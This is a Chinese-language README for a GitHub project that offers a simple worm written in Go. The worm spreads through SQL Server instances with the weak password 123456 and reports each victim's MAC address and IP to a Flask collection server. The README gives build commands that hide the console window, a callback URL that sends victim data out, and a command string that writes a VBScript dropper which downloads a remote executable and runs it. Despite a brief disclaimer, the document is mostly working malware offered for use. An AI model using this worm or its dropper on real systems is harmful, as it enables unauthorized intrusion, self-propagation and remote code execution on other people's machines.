# Simple-Worm
------------
基于Golang利用sqlserver 弱口令（123456）写的一个简单的小蠕虫  

请勿用于破坏/反正没写几个函数

Server - 基于Python flask搭建的一个简单http服务端。用于记录蠕虫返回的数据(mac信息、某个网卡ip、和上传时间)  

Client - 基于Golang编写的蠕虫主文件

Server 端依赖库
```
MySQL-python
flask
```
Server运行
```
cd server/
python web.py
```
MySQL创建
```mysql
create database bot;
create table (mac text,ip text,time text)
```
需要手动修改里面的 ** MYSQL_HOST,MYSQL_USER,MYSQL_PASS,MYSQL_DB **

运行后访问地址： http://localhost/view

Client 编译

```bash
cd client/
go build -ldflags="-H windowsgui"
```
Client 调试运行
```bash
cd client/
go run main.go func.go
```
配置修改 

func.go 修改里面的域名即可
```
url := "http://localhost/callback?ip=" + ip + "&time=" + string(time) + "&mac=" + _mac // 回传信息

var exploit = `echo Set Post = CreateObject("Msxml2.XMLHTTP") >>zl.vbs && echo Set Shell = CreateObject("Wscript.Shell") >>zl.vbs && echo Post.Open "GET","https://remote/1.exe",0 >>zl.vbs && echo Post.Send() >>zl.vbs && echo Set aGet = CreateObject("ADODB.Stream") >>zl.vbs && echo aGet.Mode = 3 >>zl.vbs && echo aGet.Type = 1 >>zl.vbs && echo aGet.Open() >>zl.vbs && echo aGet.Write(Post.responseBody) >>zl.vbs && echo aGet.SaveToFile "zl.exe",2 >>zl.vbs && echo wscript.sleep 1000 >>zl.vbs && echo Shell.Run ("zl.exe") >>zl.vbs && cscript zl.vbs`
	
```
------------
为什么编写

某个机房，里边默认安装了sqlserver,并且默认密码都是123456 

IP扫描就乱写了。里边还有部分代码不合理

蠕虫登陆后![image](https://raw.githubusercontent.com/dongdong1972/Simple-Golang-Worm/master/image/result.PNG)
------------
